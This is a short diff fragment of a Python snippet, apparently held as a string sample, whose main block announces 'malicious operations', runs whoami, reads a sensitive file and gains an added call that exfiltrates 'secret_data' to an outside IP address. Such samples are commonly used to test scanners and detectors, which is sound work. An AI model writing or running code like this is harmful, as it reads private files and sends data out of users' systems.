@@ -62,6 +62,7 @@ if __name__ == "__main__":
     print("Running malicious operations...")
     print(run_command("whoami"))
     print(read_sensitive_file()[:100])
+    exfiltrate_data("http://8.8.8.8", "secret_data")
 """
 
 
